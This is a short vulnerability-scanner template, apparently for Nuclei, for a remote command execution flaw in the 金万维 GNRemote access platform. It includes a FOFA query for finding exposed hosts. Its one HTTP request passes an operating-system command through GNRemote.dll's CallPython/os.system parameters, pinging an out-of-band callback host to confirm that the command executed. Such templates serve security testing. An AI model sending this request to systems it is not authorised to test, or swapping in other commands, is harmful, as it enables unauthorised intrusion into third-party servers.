id: jinwanwei-GNRemote-rce

info:
  name: 金万维-云联应用系统接入平台-远程命令执行-GNRemote
  author: HuanXiong
  severity: high
  metadata: 
    fofa-query: title="云联应用系统接入平台"

  tags: RCE

http:
  - raw:
      - |
        GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=ping+{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"